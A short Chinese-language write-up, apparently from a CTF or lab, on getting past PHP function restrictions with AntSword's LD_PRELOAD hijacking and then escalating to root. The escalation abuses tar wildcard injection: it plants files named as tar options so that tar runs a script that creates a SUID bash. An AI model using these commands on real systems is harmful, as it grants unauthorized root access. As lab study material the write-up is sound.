蚁剑的 LD_PRELOAD 方案可以绕过，注意选择目录，要不然好像写不进去

![image-20260225202340875](/assets/img/posts/111z/image-20260225202340875.png)

原理大概是这样

```
在 Linux 中，LD_PRELOAD 是一个环境变量，它允许你定义在程序执行时优先加载的动态链接库（.so 文件）。

劫持函数：当 PHP 执行某些内置函数（如 mail() 或 error_log()）时，PHP 进程底层会调用 Linux 的系统标准库（如 libc.so）。

偷梁换柱：如果你预先编译了一个 hack.so，并在其中定义了与系统库同名的函数（例如 getuid()），操作系统会优先执行你的 hack.so 里的代码。

触发执行：在你的 hack.so 逻辑里编写恶意命令（如反弹 Shell），然后通过 PHP 脚本触发那个被劫持的系统调用，命令就执行了。
```

sudo -l，发现是tar提权

创建三个特殊的文件，注意目录得是www-data才能写

```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod u+s /tmp/bash' > shell.sh
chmod +x shell.sh
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo '' > '--checkpoint=1'
```

原理

```
正常情况：tar czf backup.tar.gz file1 file2

漏洞情况：tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh

结果：tar 看到参数后，乖乖地以 root 身份执行了你的 shell.sh。
```
